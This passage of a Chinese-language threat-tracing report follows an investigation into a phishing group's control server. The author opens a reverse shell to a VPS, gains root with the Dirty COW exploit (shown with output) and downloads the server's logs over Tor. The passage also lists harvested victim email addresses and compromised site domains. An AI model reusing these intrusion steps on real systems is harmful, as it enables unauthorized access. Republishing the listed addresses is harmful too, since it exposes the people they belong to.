a0000020.txt:alexanderkopke@outlook.com
a0000020.txt:ali__sivan@outlook.com
a0000021.txt:alicegerner@outlook.com
a0000022.txt:allanjeppesen@outlook.com
a0000023.txt:allworlduseu@outlook.com
 ⚡ root@kali  /tmp/187.85.134.4/www/cat  grep &amp;quot;@163.com&amp;quot; *.txt |head -n 20

a0000001.txt:a31a18615@163.com
a0000001.txt:a398c671@163.com
a0000059.txt:backlink0321@163.com
a0000061.txt:banqianm8256@163.com
a0000075.txt:bf86ad32@163.com
a0000121.txt:cbb146672@163.com
a0000129.txt:chenbin800519@163.com
a0000134.txt:chuofuh3082@163.com
a0000157.txt:davidhuang001@163.com
a0000162.txt:dfjiuew@163.com
a0000209.txt:f08dbf326@163.com
a0000213.txt:fanxued79193@163.com
a0000221.txt:fjfzpy@163.com
a0000227.txt:fon@163.com
a0000259.txt:guangdk@163.com
a0000311.txt:huhuanqiang00161@163.com
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;54-提权&#34;&gt;&lt;strong&gt;5.4 提权&lt;/strong&gt;&lt;/h3&gt;
&lt;h4 id=&#34;541-cve-2013-2094cve-2013-1763提权&#34;&gt;&lt;strong&gt;5.4.1 CVE-2013-2094，CVE-2013-1763提权&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;查看apache日志目录，发现没有权限。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[/var/www/]$ls -al /var/log/apache2/
ls: cannot open directory /var/log/apache2/: Permission denied
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;内核版本为&lt;code&gt;3.5.0-23&lt;/code&gt;，尝试提权。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[/var/www/]$cat /etc/issue
Ubuntu 12.04.2 LTS \n \l

[/var/www/]$uname -an
Linux medidor2 3.5.0-23-generic #35~precise1-Ubuntu SMP Fri Jan 25 17:15:33 UTC 2013  GNU/Linux
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://camo.githubusercontent.com/c36b462425635925d59cfd9e84bbb33b0d286f12/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6a787535746f306e633864653079747a39726965756c736f2f332e352e302d32332d612e706e67&#34; alt=&#34;3.5.0-23-a.png-104.5kB&#34;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;WebShell反弹：
[/var/www/]$cd /var/tmp;./pty  xxx.xxx.xxx.xxx 443

外网VPS监听：
socat file:`tty`,echo=0,raw tcp-listen:443
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://camo.githubusercontent.com/c0c1381a55e04b5b7f3b28873627cffeffbccbde/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f32366d637173656b7a73646c396a6d686d613232673734392f323031382d31322d303425323031342d34332d30352545352542312538462545352542392539352545362538382541412545352539422542452e706e67&#34; alt=&#34;2018-12-04 14-43-05屏幕截图.png-61.7kB&#34;&gt;&lt;/p&gt;
&lt;p&gt;实际测试&lt;code&gt;CVE-2013-2094，CVE-2013-1763&lt;/code&gt;均无法提权。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;CVE-2013-2094
Linux Kernel 3.2.0-23/3.5.0-23 (Ubuntu
12.04/12.04.1/12.04.2 x64) - &#39;perf_swevent_init&#39; Local Privilege Escalation (3)

CVE-2013-1763
Linux Kernel &amp;lt; 3.5.0-23 (Ubuntu 12.04.2 x64) - &#39;SOCK_DIAG&#39; SMEP Bypass Local Privilege Escalation
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;542-脏牛提权&#34;&gt;&lt;strong&gt;5.4.2 脏牛提权&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;祭出大杀器CVE-2016-5195（脏牛） ， 理论上通杀 2.6.22 &amp;lt; 3.9 (x86/x64)的内核版本。&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;在本地环境提权测试过程中发现，i386架构下使用cowroot提权时EXP会破坏源文件，导致提权失败。而使用dirtycow-mem仅修改内存则没有问题，但是存在内核崩溃的风险。这两个EXP都是利用/proc/self/mem提权，前一个修改文件，后一个修改内存。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;如图所示： &lt;img src=&#34;https://camo.githubusercontent.com/2692b63d3e12f741e7dabd3bbb210ea0d7ebc20c/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6171773777346e6f7370386662696c777861386e37696e672f53637265656e73686f742d323031392d312d3233253230436172626f6e2e706e67&#34; alt=&#34;Screenshot-2019-1-23 Carbon.png-68.1kB&#34;&gt;&lt;/p&gt;
&lt;p&gt;使用dirtycow-mem.c提权时需要注意：i386架构下编译前需要将源代码中libc路径修改为目标系统libc路径，否则执行时找不到文件。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#define SHELLCODE	&amp;quot;\x31\xc0\xc3&amp;quot;
#define SPACE_SIZE	256
#define LIBC_PATH	&amp;quot;/lib/x86_64-linux-gnu/libc.so.6&amp;quot;  ## 改为　/lib/i386-linux-gnu/libc.so.6
#define LOOP		0x1000000

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Give me root 　:），提权成功。&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;www-data@medidor2:/tmp$gcc -Wall -o hello dirtycow-mem.c -ldl -lpthread
www-data@medidor2:/tmp$ ls
hello
www-data@medidor2:/tmp$ chmod +x hello
www-data@medidor2:/tmp$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@medidor2:/tmp$ ./hello
[*] range: b7573000-b7716000]
[*] getuid = b762bd10
[*] mmap 0xb73cb000
[*] exploiting (patch)
[*] patched (madviseThread)
[*] patched (procselfmemThread)
root@medidor2:/tmp# [*] exploiting (unpatch)
[*] unpatched: uid=33 (madviseThread)
[*] unpatched: uid=33 (procselfmemThread)

root@medidor2:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;打包Apache日志。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;✘ ⚡ root@kali  ls /var/log/apache2
access  error  other_vhosts_access.log

✘ ⚡ root@kali  tar zcvf /var/www/apache2-log.tar.gz  /var/log/apache2/
✘ ⚡ root@kali  /tmp  ltor wget http://187.85.134.4/apache2-log.tar.gz  
[proxychains] config file found: /data/app/local/proxychains_local_tor/proxychains.conf
[proxychains] preloading /data/app/local/proxychains_local_tor/libproxychains4.so
[proxychains] DLL init
--2011-11-11 11:11:11--  http://187.85.134.4/apache2-log.tar.gz
正在连接 187.85.134.4:80... [proxychains] Strict chain  ...  127.0.0.1:9050  ...  187.85.134.4:80  ...  OK
已连接。
已发出 HTTP 请求，正在等待回应... 200 OK
长度：9258688 (8.8M) [application/x-gzip]
正在保存至: “apache2-log.tar.gz”

apache2-log.tar.gz  100%[===================&amp;gt;]   8.83M  29.6KB/s  用时 5m 45s  

2018-11-11 11:11:11 (26.2 KB/s) - 已保存 “apache2-log.tar.gz” [9258688/9258688])
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;55-分析日志&#34;&gt;&lt;strong&gt;5.5 分析日志&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;分析IP访问情况&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;⚡ root@kali  /tmp/  grep &amp;quot;/cacat/&amp;quot; * |grep &amp;quot;php&amp;quot; | awk -F &amp;quot;:&amp;quot; &#39;{print $2}&#39; |awk &#39;{a[$1]+=1;} END {for(i in a){print a[i]&amp;quot; &amp;quot;i;}}&#39; |sort -t &amp;quot; &amp;quot; -k 1 -n -r &amp;gt;ip.txt

95 185.56.80.138
77 197.211.60.52
70 67.71.3.8
59 207.35.210.35
41 99.226.207.46
41 193.215.40.238
39 197.211.59.163
38 82.61.95.132
38 66.249.73.95
37 76.26.34.181
37 197.234.221.77
31 105.112.27.60
29 105.112.23.41
20 109.166.138.68
16 66.249.79.61
16 197.211.61.18
14 212.100.77.191
12 197.234.221.210
8 66.249.79.35
8 66.249.73.64
7 154.118.69.165
5 66.249.73.67

......


 ⚡ root@kali  /tmp  for line in $(&amp;lt;ip.txt); do curl https://ip.cn/\?ip\=$line ; done
IP: 185.56.80.138 来自: 荷兰 
IP: 197.211.60.52 来自: 尼日利亚 
IP: 67.71.3.8 来自: 加拿大 
IP: 207.35.210.35 来自: 加拿大 
IP: 99.226.207.46 来自: 加拿大 
IP: 193.215.40.238 来自: 挪威 
IP: 197.211.59.163 来自: 尼日利亚
IP: 82.61.95.132 来自: 意大利 
IP: 66.249.73.95 来自: Google 骨干网
IP: 76.26.34.181 来自: 美国 
IP: 197.234.221.77 来自: 贝宁 
IP: 105.112.27.60 来自: 尼日利亚 
IP: 105.112.23.41 来自: 尼日利亚 
IP: 109.166.138.68 来自: 罗马尼亚 
IP: 66.249.79.61 来自: Google 骨干网
IP: 197.211.61.18 来自: 尼日利亚 
IP: 212.100.77.191 来自: 尼日利亚 
IP: 197.234.221.210 来自: 贝宁 
IP: 66.249.79.35 来自: Google 骨干网
IP: 66.249.73.64 来自: Google 骨干网
IP: 154.118.69.165 来自: 尼日利亚 
IP: 66.249.73.67 来自: Google 骨干网
......
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;根据路径名判断，疑似受害者访问了钓鱼页面。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; ⚡ root@kali  /tmp/ grep &amp;quot;/cacat&amp;quot; *| grep &amp;quot;php&amp;quot; |grep &amp;quot;POST&amp;quot; |awk -F &amp;quot;:&amp;quot; &#39;{print $2 $6}&#39; |sort |uniq 
109.166.138.68 - - [31/Jan/2018//187.85.134.4/cacat/portal/portal/userlogin.php&amp;quot; &amp;quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36&amp;quot;
109.166.138.68 - - [31/Jan/2018//187.85.134.4/cacat/portal/portal/userlogin.php?sfm_sid=120&amp;quot; &amp;quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36&amp;quot;

185.56.80.138 - - [31/Jan/2018//187.85.134.4/cacat/portal/portal/userlogin.php?sfm_sid=8425&amp;quot; &amp;quot;Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&amp;quot;

196.52.34.20 - - [12/Oct/201835.0) Gecko/20100101 Firefox/35.0&amp;quot;

207.35.210.35 - - [21/Aug/2018//187.85.134.4/cacat/win2018/winbnk/EBlogin.html?sitecode=GR&amp;amp;lang=el-GR&amp;quot; &amp;quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36&amp;quot;

197.211.60.52 - - [07/Sep/2018:16:02:40 -0300] &amp;quot;GET /cacat/nnnnn.zip HTTP/1.1&amp;quot; 200 4489167 &amp;quot;http://187.85.134.4/cacat/&amp;quot; &amp;quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36&amp;quot;
 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;查看web目录下txt文件访问情况，总共有一万多IP。访问地址包含受害者主机IP、各种搜索引擎爬虫IP、各路黑客的IP等等。&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;grep &amp;quot;/cacat/&amp;quot; * |grep &amp;quot;txt&amp;quot; | awk -F &amp;quot;:&amp;quot; &#39;{print $2}&#39; |awk &#39;{a[$1]+=1;} END {for(i in a){print a[i]&amp;quot; &amp;quot;i;}}&#39; |sort -t &amp;quot; &amp;quot; -k 1 -n -r  &amp;gt;ip.txt
 ⚡ root@kali  ~/Desktop  wc -l ip.txt                                                        
10101 ip.txt
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;56-访问ip热力图&#34;&gt;&lt;strong&gt;5.6 访问IP热力图&lt;/strong&gt;&lt;/h3&gt;
&lt;h4 id=&#34;561-ip转经纬度坐标&#34;&gt;&lt;strong&gt;5.6.1 IP转经纬度坐标&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;将获得的IP转换成经纬度坐标，再通过百度地图API生成热力图&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;将IP转换成经纬度坐标，脚本：&lt;code&gt;ip2xy.py&lt;/code&gt; 生成经纬度坐标文件：&lt;code&gt;point.js&lt;/code&gt; 全球IP库：&lt;code&gt;GeoLiteCity.dat&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code&gt;#!/usr/bin/python
#coding:utf-8
import pandas as pd
import pygeoip
import types
import sys

gi = pygeoip.GeoIP(&#39;/tmp/GeoLiteCity.dat&#39;, pygeoip.MEMORY_CACHE)
def getLocal(ip):

    if type(ip) != types.StringType:
        print ip
        return
    location = gi.record_by_addr(ip)
    if location is None:
        print ip
        return
    lng = location[&#39;longitude&#39;]
    lat = location[&#39;latitude&#39;]
    str_temp = &#39;{&amp;quot;lat&amp;quot;:&#39; + str(lat) + &#39;,&amp;quot;lng&amp;quot;:&#39; + str(lng) + &#39;},\n&#39;
    print ip,lng,lat,str_temp
    file.write(str_temp)


file = open(&#39;/tmp/point.js&#39;, &#39;w&#39;)
file.write(&amp;quot;var points =[\n&amp;quot;)
with open(&amp;quot;/tmp/ip.txt&amp;quot;) as f:
    i = 0
    for ip in  f.readlines():
        getLocal(ip)

file.write(&amp;quot;];\n&amp;quot;)
file.close()
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;562-调用百度地图api&#34;&gt;&lt;strong&gt;5.6.2 调用百度地图API&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;本地调用百度地图 JavaScript API： map.html&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt;
&amp;lt;head&amp;gt;
&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;meta http-equiv=&amp;quot;Content-Type&amp;quot; content=&amp;quot;text/html; charset=utf-8&amp;quot; /&amp;gt;
    &amp;lt;meta name=&amp;quot;viewport&amp;quot; content=&amp;quot;initial-scale=1.0, user-scalable=no&amp;quot; /&amp;gt;
    &amp;lt;script type=&amp;quot;text/javascript&amp;quot; src=&amp;quot;http://api.map.baidu.com/api?v=2.0&amp;amp;ak=填写自己的百度AK&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
    &amp;lt;script type=&amp;quot;text/javascript&amp;quot; src=&amp;quot;http://api.map.baidu.com/library/Heatmap/2.0/src/Heatmap_min.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;script type=&amp;quot;text/javascript&amp;quot; src=&amp;quot;./point.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
    &amp;lt;title&amp;gt;热力图功能示例&amp;lt;/title&amp;gt;
    &amp;lt;style type=&amp;quot;text/css&amp;quot;&amp;gt;
		ul,li{list-style: none;margin:0;padding:0;float:left;}
		html{height:100%}
		body{height:100%;margin:0px;padding:0px;font-family:&amp;quot;微软雅黑&amp;quot;;}
		#container{height:100%;width:100%;}
		#r-result{width:100%;}
    &amp;lt;/style&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
	&amp;lt;div id=&amp;quot;container&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;
	&amp;lt;div id=&amp;quot;r-result&amp;quot; style=&amp;quot;display:none&amp;quot;&amp;gt;
		&amp;lt;input type=&amp;quot;button&amp;quot;  onclick=&amp;quot;openHeatmap();&amp;quot; value=&amp;quot;显示热力图&amp;quot;/&amp;gt;&amp;lt;input type=&amp;quot;button&amp;quot;  onclick=&amp;quot;closeHeatmap();&amp;quot; value=&amp;quot;关闭热力图&amp;quot;/&amp;gt;
	&amp;lt;/div&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&amp;lt;script type=&amp;quot;text/javascript&amp;quot;&amp;gt;
    var map = new BMap.Map(&amp;quot;container&amp;quot;);          // 创建地图实例
 
    var point = new BMap.Point(34.0224714118,109.0786868715);
    map.centerAndZoom(point, 6);             // 初始化地图，设置中心点坐标和地图级别
	map.setCurrentCity(&amp;quot;西安&amp;quot;);		//设置当前显示城市
    map.enableScrollWheelZoom(); // 允许滚轮缩放
 
 
 
    if(!isSupportCanvas()){
        alert(&#39;热力图目前只支持有canvas支持的浏览器,您所使用的浏览器不能使用热力图功能~&#39;)
    }
    //详细的参数,可以查看heatmap.js的文档 https://github.com/pa7/heatmap.js/blob/master/README.md
    //参数说明如下:
    /* visible 热力图是否显示,默认为true
     * opacity 热力的透明度,1-100
     * radius 势力图的每个点的半径大小
     * gradient  {JSON} 热力图的渐变区间 . gradient如下所示
     *  {
            .2:&#39;rgb(0, 255, 255)&#39;,
            .5:&#39;rgb(0, 110, 255)&#39;,
            .8:&#39;rgb(100, 0, 255)&#39;
        }
        其中 key 表示插值的位置, 0~1.
            value 为颜色值.
     */
    heatmapOverlay = new BMapLib.HeatmapOverlay({&amp;quot;radius&amp;quot;:100,&amp;quot;visible&amp;quot;:true});
    map.addOverlay(heatmapOverlay);
    heatmapOverlay.setDataSet({data:points,max:100});
	
    //closeHeatmap();
	
	
 
    //判断浏览区是否支持canvas
    function isSupportCanvas(){
        var elem = document.createElement(&#39;canvas&#39;);
        return !!(elem.getContext &amp;amp;&amp;amp; elem.getContext(&#39;2d&#39;));
    }
 
    function setGradient(){
        /*格式如下所示:
        {
            0:&#39;rgb(102, 255, 0)&#39;,
            .5:&#39;rgb(255, 170, 0)&#39;,
            1:&#39;rgb(255, 0, 0)&#39;
        }*/
        var gradient = {};
        var colors = document.querySelectorAll(&amp;quot;input[type=&#39;color&#39;]&amp;quot;);
        colors = [].slice.call(colors,0);
        colors.forEach(function(ele){
            gradient[ele.getAttribute(&amp;quot;data-key&amp;quot;)] = ele.value;
        });
        heatmapOverlay.setOptions({&amp;quot;gradient&amp;quot;:gradient});
    }
 
    function openHeatmap(){
        heatmapOverlay.show();
    }
 
    function closeHeatmap(){
        heatmapOverlay.hide();
    }
&amp;lt;/script&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;563-生成热力图&#34;&gt;&lt;strong&gt;5.6.3 生成热力图&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;如图所示，欧洲IP居多，亚洲也不少。至于有多少主机沦陷和多少受害者上钩，无法准确判断。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://camo.githubusercontent.com/447d0dcd09fed26ab2f4f9ed99b943756a71c7cc/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f777465643535396a7a63643278397074396c6f7367326c752f2545372538332541442545352538412539422545352539422542452545462542432539312e706e67&#34; alt=&#34;热力图１.png-526.6kB&#34;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;img src=&#34;https://camo.githubusercontent.com/c01cd78bd57faa9ade3be5232fd61326eafb3a25/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f79636673376c3066366371686d393672306f6636656570312f254537253833254144254535253841253942254535253942254245322e706e67&#34; alt=&#34;热力图2.png-357.6kB&#34;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;img src=&#34;https://camo.githubusercontent.com/15cd9e86590c6db60de17e0ee9cb13f996894054/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f3374717a303672756c78337933767466336265306d3738332f254537253833254144254535253841253942254535253942254245332e706e67&#34; alt=&#34;热力图3.png-1196.3kB&#34;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;六信息汇总&#34;&gt;六、信息汇总&lt;/h2&gt;
&lt;p&gt;根据所得信息汇总，对这个黑客组织信息进行简单分析，仅供参考。&lt;/p&gt;
&lt;h3 id=&#34;61-组织信息&#34;&gt;&lt;strong&gt;6.1 组织信息&lt;/strong&gt;&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;名称：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Muslim Cyber Corp - Mujahidin Cyber Army - Family Attack Cyber&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;地区：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;巴勒斯坦&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;成员ID：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Hawk_B404 、 MR.S1NS_Y 、 koneksi eror 、 GU3LT03M 、 SinonX 、 ./B4Z1R007 、 ./Bl4ckJ4ck 、 anon99husein 、 4GottenName 、Gantai 、 4nzeL4 、 AKEMI403&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;历史邮箱：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;mailto:alexsin54@yahoo.com&#34;&gt;alexsin54@yahoo.com&lt;/a&gt; &lt;a href=&#34;mailto:jasonchowan223@gmail.com&#34;&gt;jasonchowan223@gmail.com&lt;/a&gt; &lt;a href=&#34;mailto:macacperus@yopmail.com&#34;&gt;macacperus@yopmail.com&lt;/a&gt; &lt;a href=&#34;mailto:bidibidibidi@yopmail.com&#34;&gt;bidibidibidi@yopmail.com&lt;/a&gt; &lt;a href=&#34;mailto:bidi.pici11@hotmail.com&#34;&gt;bidi.pici11@hotmail.com&lt;/a&gt; &lt;a href=&#34;mailto:bidi.cuc@mail.com&#34;&gt;bidi.cuc@mail.com&lt;/a&gt; &lt;a href=&#34;mailto:flrnvasilica@gmail.com&#34;&gt;flrnvasilica@gmail.com&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;组织主页：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;http://mujahidincyberarmy.blogspot.com/&#34;&gt;http://mujahidincyberarmy.blogspot.com/&lt;/a&gt; &lt;a href=&#34;https://www.facebook.com/FamilyAttackCyberOfficial/&#34;&gt;https://www.facebook.com/FamilyAttackCyberOfficial/&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;62-攻击手段&#34;&gt;&lt;strong&gt;6.2 攻击手段&lt;/strong&gt;&lt;/h3&gt;
&lt;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;入侵使用Wordpress、Joomla! CMS的网站、放置钓鱼程序，批量传播钓鱼邮件。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;攻击目标：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;早期政治目的居多，主要攻击美国政府机构网站和雇员。近期多为商业目的，主要针对欧洲银行客户以及亚洲金融机构雇员进行邮件钓鱼。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;控制主机：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;187.85.134.4&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;常用后门：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;略&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;63-攻击历史&#34;&gt;&lt;strong&gt;6.3 攻击历史&lt;/strong&gt;&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;美国联邦调查局、美国国土安全部、美国司法部&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;巴勒斯坦黑客已经发布了大约2万名联邦调查局（FBI）和9,000名国土安全部（DHS）官员的个人信息 &lt;a href=&#34;http://mujahidincyberarmy.blogspot.com/2016/12/inilah-data-informasi-pribadi-20-ribu.html&#34;&gt;http://mujahidincyberarmy.blogspot.com/2016/12/inilah-data-informasi-pribadi-20-ribu.html&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;通过钓鱼邮件获得美国司法部权限 &lt;a href=&#34;http://mujahidincyberarmy.blogspot.com/2016/02/hacker-pro-palestina-terbitkan.html&#34;&gt;http://mujahidincyberarmy.blogspot.com/2016/02/hacker-pro-palestina-terbitkan.html&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;64-代理ip&#34;&gt;&lt;strong&gt;6.4 代理IP&lt;/strong&gt;&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;174.85.145.99 (美国) - - [27/Nov/2018:23:35:31 +0300] &amp;quot;POST /shells/bacu.php HTTP/1.1&amp;quot; 200 4731 &amp;quot;http://www.rosturplast.com/shells/bacu.php&amp;quot; &amp;quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36&amp;quot;

50.73.252.169 (美国) - - [29/Nov/2018//www.rosturplast.com/shells/config.php&amp;quot; &amp;quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36&amp;quot;

213.233.104.120 (罗马尼亚) - - [27/Nov/2018:22:10:03 +0300] &amp;quot;GET /shells/config.php HTTP/1.1&amp;quot; 200 124 &amp;quot;-&amp;quot; &amp;quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0&amp;quot;

207.228.149.69 (百慕大 ) - - [28/Nov/2018:23:12:54 +0300] &amp;quot;POST /shells/config.php HTTP/1.1&amp;quot; 200 3729 &amp;quot;http://www.rosturplast.com/shells/config.php&amp;quot; &amp;quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36&amp;quot;

195.211.23.207 (俄罗斯) - - [27/Nov/2018:22:36:50 +0300] &amp;quot;GET /shells/config.php HTTP/1.1&amp;quot; 200 124 &amp;quot;-&amp;quot; &amp;quot;Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36&amp;quot;

29.205.113.8 (尼日利亚) - - [30/Nov/2018//www.rosturplast.com/shells/config.php&amp;quot; &amp;quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36&amp;quot;

212.1.211.3 （美国） - - [30/Nov/2018:13:35:36 -0300] &amp;quot;GET /online/templates/beez5/bc.php HTTP/1.1&amp;quot; 200 16823 &amp;quot;-&amp;quot; &amp;quot;Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)&amp;quot;

178.128.221.199 （希腊）- - [29/Nov/2018//www.zebramedia.al/wp-content/themes/shells/INSTALL.sql.txt.php&amp;quot; &amp;quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&amp;quot;

197.211.61.82 （尼日利亚) - - [29/Nov/2018//www.zebramedia.al/wp-content/themes/shells/INSTALL.sql.txt.php&amp;quot; &amp;quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36&amp;quot;
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;65-被黑网站&#34;&gt;&lt;strong&gt;6.5 被黑网站&lt;/strong&gt;&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;不完全统计

rosturplast.com
mirohaviar.sk
helioncomposites.com
radiolanalhue.cl
zebramedia.al
www.qtfontebispo.com
www.seoeaze.com
vilapoucadeaguiar.com
proyectosphr.cl
u-p.com
www.humanaconsultores.cl
amsogroup.com
www.tdftechnologies.com
www.bvvagos.pt
www.huellasdigitales.cl
lince.apsl.edu.pl
www.fica.unsl.edu.ar
proyectosphr.cl
www.zlobek.uw.edu.pl
ifr.pt
mail.ijrer.org
www.hkmms.org.hk
historia.apsl.edu.pl
www.homeguide.com.sg
onlinecombos.co.in
umo.apsl.edu.pl
www.bpmp2t.lombokbaratkab.go.id
amsogroup.com
viper.cl
www.teniscavancha.cl
www.estacaomedica.pt
terrarestobar.cl
jf-bragado.pt
helioncomposites.com
notariabasualto.cl
ericdiblasi.com
reinamarltda.cl
cobraz.pt
www.stmarypellaia.com
webcam.wm-itservice.at
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h2 id=&#34;七攻击路径还原&#34;&gt;七、攻击路径还原&lt;/h2&gt;
&lt;p&gt;复盘整个溯源过程，还原攻击者攻击路径。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://camo.githubusercontent.com/e54ac5ad8cbe0d6686b5eb04b0f92aa9263ceda7/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f75303663797438757772766f33323172617374706b746b742f254536253934254242254535253837254242254538254237254146254535254245253834254546254243253931253230253238342532392e706e67&#34; alt=&#34;攻击路径１ (4).png-215.2kB&#34;&gt;&lt;/p&gt;
